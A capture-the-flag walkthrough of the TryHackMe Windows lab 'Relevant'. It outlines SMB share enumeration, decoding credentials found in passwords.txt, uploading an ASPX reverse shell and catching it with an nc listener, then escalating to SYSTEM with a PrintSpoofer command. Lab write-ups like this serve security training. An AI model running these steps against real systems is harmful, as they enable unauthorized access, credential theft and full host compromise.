🧠 TryHackMe – Relevant (Medium | Windows)
📌 Overview
Machine Name: Relevant
Difficulty: Medium
Platform: TryHackMe
Type: Windows
🔍 Enumeration
🔹 Nmap Scan
nmap -sV -p- <IP>
🔹 Findings
80/tcp → HTTP (Microsoft IIS 10.0)
135/tcp → RPC
139/tcp → NetBIOS
445/tcp → SMB
3389/tcp → RDP
49663, 49666, 49667 → High ports
📂 SMB Enumeration
🔹 SMB Share Discovery
smbclient -L //<IP>/
🔹 Findings
Found share: nt4wrksv
Weak credentials allowed access
smbclient //<IP>/nt4wrksv
🔹 Sensitive File
Found: passwords.txt
get passwords.txt
🔹 Credential Discovery
File contained encoded data
Decoded credentials:
Bob : <password>
Bill : <password>
💣 Initial Access (Web Exploitation)
🔹 Payload Creation
Generated ASPX reverse shell using msfvenom
🔹 Upload
Uploaded: shell.aspx to accessible directory
🐚 Reverse Shell
🔹 Listener
nc -lvnp <port>
🔹 Execution
http://<IP>/shell.aspx
🔹 Result
Reverse shell successfully obtained ✅
🔎 Directory Discovery
🔹 Testing Paths
http://<IP>:49663/nt4wrksv/shell.aspx
Confirmed working execution path
📁 Post Exploitation
🔹 Navigation
C:\Users\Bob\Desktop\
🔹 Findings
Found: user.txt ✅
⚠️ Privilege Escalation
🔹 Enumeration
whoami /priv
🔹 Finding
SeImpersonatePrivilege enabled
💥 Exploitation
🔹 Tool Used
PrintSpoofer
PrintSpoofer64.exe -i -c cmd
🔹 Result
Gained SYSTEM shell 🔥
🏁 Root Access
🔹 Navigation
C:\Users\Administrator\Desktop\
🔹 Final Flag
Found: root.txt ✅
